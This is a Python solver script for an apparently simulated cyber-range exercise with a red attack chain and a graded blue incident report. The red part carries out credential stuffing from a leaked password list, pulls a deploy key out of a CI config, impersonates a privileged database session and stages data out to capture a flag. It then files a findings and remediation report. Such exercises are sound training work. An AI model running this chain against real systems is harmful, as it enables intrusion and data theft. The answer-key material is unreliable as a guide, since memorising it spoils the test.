"""Intended-path solver: run the full red chain, then file the graded blue report."""

import re

import httpx
from openrange.content.solver import SolveResult, TaskResult, find_flags

PORTAL = {"Host": "portal.spectrum.io"}
GIT = {"Host": "git.internal.spectrum.io"}
DB = {"Host": "core-db.spectrum.internal"}
ARCH = {"Host": "archive.spectrum.internal"}
IR = {"Host": "ir.spectrum.io"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail_red = None
    detail_blue = None
    red_flag: str | None = None
    blue_flag: str | None = None

    corpus = httpx.get(base + "/static/partner-breach.txt", headers=PORTAL, timeout=10).text
    session = ""
    for line in corpus.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        user, password = line.split(":", 1)
        reply = httpx.post(
            base + "/login",
            headers=PORTAL,
            json={"username": user, "password": password},
            timeout=10,
        )
        if reply.status_code == 200 and reply.json().get("authenticated"):
            session = str(reply.json().get("session", ""))
            break
    if not session:
        detail_red = "no corpus credential authenticated against the portal"
    else:
        httpx.get(
            base + "/api/jump/git", headers=PORTAL | {"X-Spectrum-Session": session}, timeout=10
        )
        ci = httpx.get(
            base + "/projects/edge-api/blob/CI.yml",
            headers=GIT | {"X-Spectrum-Session": session},
            timeout=10,
        ).text
        m_key = re.search(r'console_key:\s*"?(DBK-[A-Za-z0-9-]+)"?', ci)
        deploy_key = m_key.group(1) if m_key else ""
        if not deploy_key and detail_red is None:
            detail_red = f"CI config lacked a console key: {ci[:200]}"

        console_token = ""
        admin_sid = ""
        dataset = ""
        if deploy_key:
            login = httpx.post(
                base + "/console/login", headers=DB, json={"key": deploy_key}, timeout=10
            ).json()
            console_token = str(login.get("console_token", ""))
            if not console_token and detail_red is None:
                detail_red = f"core-db refused the pipeline key: {login}"
        if console_token:
            sessions = httpx.get(
                base + "/console/sessions",
                headers=DB | {"X-Console-Token": console_token},
                timeout=10,
            ).json()
            privileged = next(
                (s for s in sessions.get("sessions", []) if s.get("privileged")), None
            )
            if privileged is None and detail_red is None:
                detail_red = "no privileged sid in core-db session list"
            else:
                impersonate = httpx.post(
                    base + "/console/impersonate",
                    headers=DB | {"X-Console-Token": console_token},
                    json={"sid": privileged["sid"]},
                    timeout=10,
                ).json()
                admin_sid = str(impersonate.get("admin_sid", ""))
                dataset = str(impersonate.get("staging_dataset", ""))
        if admin_sid and dataset:
            staged = httpx.post(
                base + "/archive/stage",
                headers=ARCH | {"X-Spectrum-Admin": admin_sid},
                json={"dataset": dataset, "destination": "mirror-b"},
                timeout=10,
            ).json()
            flags = find_flags(str(staged.get("flag", "")))
            if staged.get("staged") and flags:
                red_flag = flags[0]
            elif detail_red is None:
                detail_red = f"archive staging refused: {staged}"
        elif detail_red is None:
            detail_red = "red chain stalled before exfiltration"

    if red_flag:
        rubric = httpx.get(base + "/rubric", headers=IR, timeout=10).json()
        _ = rubric
        report = {
            "scope": [
                "portal.spectrum.io",
                "git.internal.spectrum.io",
                "core-db.spectrum.internal",
                "archive.spectrum.internal",
            ],
            "findings": [
                {"id": "F1", "slug": "reused-partner-credentials", "severity": "high"},
                {"id": "F2", "slug": "ci-config-exposes-deploy-key", "severity": "critical"},
                {"id": "F3", "slug": "admin-session-impersonation", "severity": "critical"},
                {"id": "F4", "slug": "unmonitored-archive-staging", "severity": "medium"},
            ],
            "remediation": [
                "rotate-and-vault-deploy-keys",
                "scrub-ci-secrets-and-history",
                "bind-admin-sessions",
                "alert-on-staging-volume",
            ],
        }
        review = httpx.post(base + "/review", headers=IR, json=report, timeout=10)
        payload = review.json()
        flags = find_flags(str(payload.get("flag", "")))
        if payload.get("graded") and flags:
            blue_flag = flags[0]
        elif detail_blue is None:
            detail_blue = f"review desk rejected the report: {payload}"

    return SolveResult(
        results=[
            TaskResult(
                task_id="red-chain", ok=red_flag is not None, captured=red_flag, detail=detail_red
            ),
            TaskResult(
                task_id="blue-report",
                ok=blue_flag is not None,
                captured=blue_flag,
                detail=detail_blue,
            ),
        ]
    )
